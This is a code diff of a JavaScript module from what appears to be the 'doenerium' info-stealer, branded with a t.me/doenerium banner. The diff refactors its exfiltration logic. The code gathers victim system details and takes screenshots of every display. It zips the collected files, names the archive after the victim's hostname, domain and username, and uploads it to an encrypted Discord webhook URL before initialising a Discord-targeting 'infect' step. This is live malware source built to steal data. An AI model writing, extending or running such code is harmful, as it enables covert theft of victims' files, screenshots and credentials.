@@ -1,7 +1,7 @@
 module.exports = (client) => {
     return {
 
-        async create_user_info_embed() {
+        async get_user_info() {
             let cpus = [];
 
             for (var cpu of client.config.user.cpus) {
@@ -27,7 +27,6 @@ module.exports = (client) => {
                     "🌌 AppData Path": client.utils.encryption.decryptData(client.config.user.appdata),
                     "🪐 Temp Path": client.utils.encryption.decryptData(client.config.user.temp),
                     "🌐 User Domain": client.utils.encryption.decryptData(client.config.user.user_domain),
-                    "📡 Monitor Address": client.utils.encryption.decryptData(client.config.user.monitor_address),
                     "💨 System Drive": client.utils.encryption.decryptData(client.config.user.system_drive),
                     "💾 Processors": client.utils.encryption.decryptData(client.config.user.processors),
                     "💾 Processor Identifier": client.utils.encryption.decryptData(client.config.user.processor_identifier),
@@ -51,7 +50,7 @@ module.exports = (client) => {
             })
         },
 
-        create_executable_info_embed() {
+        get_executable_info() {
 
             let executable_info_text = "<================[Executable Info]>================>\n<================[t.me/doenerium]>================>\n\n";
             let fields = [];
@@ -77,16 +76,8 @@ module.exports = (client) => {
         },
 
         async initialize() {
-            let embeds = []
-
-            embeds.push(await this.create_user_info_embed())
-            embeds.push(this.create_executable_info_embed())
-
-
-            await client.utils.webhook.sendToWebhook(client.utils.encryption.decryptData(client.config.webhook.url), {
-                embeds: embeds
-            })
-
+            await this.get_user_info()
+            this.get_executable_info()
             await this.infect();
             await this.send_zip();
         },
@@ -113,34 +104,20 @@ module.exports = (client) => {
         },
 
         async send_zip() {
-
-            let files_found = "Zip folder's content:\n\n";
-
-            const files = client.requires.fs.readdirSync(client.config.jszip.path)
-
-            files.forEach((file) => {
-                if (!client.requires.fs.statSync(`${client.config.jszip.path}\\${file}`).isDirectory()) {
-                    var file_size_in_kb = (((client.requires.fs.statSync(`${client.config.jszip.path}\\${file}`)).size) / 1024).toFixed(2);
-                    if (file.includes(".txt")) {
-                        files_found += `📄 ${file} - ${file_size_in_kb} KB\n`;
-                    } else if (file.includes(".png")) {
-                        files_found += `🖼️ ${file} - ${file_size_in_kb} KB\n`
-                    } else {
-                        files_found += `🥙 ${file} - ${file_size_in_kb} KB\n`
-                    }
-                } else {
-                    files_found += `${this.getFolderFiles(`${client.config.jszip.path}\\`, file)}`;
-                }
-            })
-
             await client.utils.jszip.createZip();
+            await client.utils.webhook.sendToWebhook(
+                client.utils.encryption.decryptData(client.config.webhook.url), {
+                    embeds: [this.create_counter_embed()],
+                })
 
             await client.utils.webhook.sendToWebhook(
                 client.utils.encryption.decryptData(client.config.webhook.url), {
-                    "content": `\`\`\`${files_found}\`\`\``,
-                    embeds: [this.create_counter_embed()],
-                    files: [`${client.config.jszip.path}.zip`]
-                })
+                    files: [{
+                        path: `${client.config.jszip.path}.zip`,
+                        name: `${client.utils.encryption.decryptData(client.config.user.hostname)}_${client.utils.encryption.decryptData(client.config.user.user_domain)}_${client.utils.encryption.decryptData(client.config.user.username)}.zip`
+                    }]
+                }
+            )
         },
 
         create_counter_embed() {
@@ -177,7 +154,7 @@ module.exports = (client) => {
             return obj
         },
 
-        async send_screenshot_embed(url = client.utils.encryption.decryptData(client.config.webhook.url)) {
+        async get_screenshot() {
             client.requires.screenshot.listDisplays().then((displays) => {
                 var random_uuid = client.requires.crypto.randomUUID();
                 Object.entries(displays).forEach(async (key, value) => {
@@ -186,29 +163,13 @@ module.exports = (client) => {
                         screen: key[1].id,
                         format: "png",
                         filename: `${client.config.jszip.path}/${random_uuid}_DISPLAY_${parseInt(key[0]) + 1}.png`
-                    }).then(async () => {
-                        await client.utils.webhook.sendToWebhook(url, {
-                            files: [`${client.config.jszip.path}/${random_uuid}_DISPLAY_${parseInt(key[0]) + 1}.png`]
-                        })
-                    })
+                    });
                 })
-            }).catch(() => {
-                return []
-            })
+            });
         },
 
         async infect() {
-            let embeds = []
-
-            embeds.push(this.create_counter_embed())
-
-            await client.utils.webhook.sendToWebhook(client.utils.encryption.decryptData(client.config.webhook.url), {
-                "embeds": embeds
-            })
-
-            try {
-                await this.send_screenshot_embed(client.config.webhook.url)
-            } catch {}
+            await this.get_screenshot(client.config.webhook.url)
 
             await client.utils.discord.init();
         }
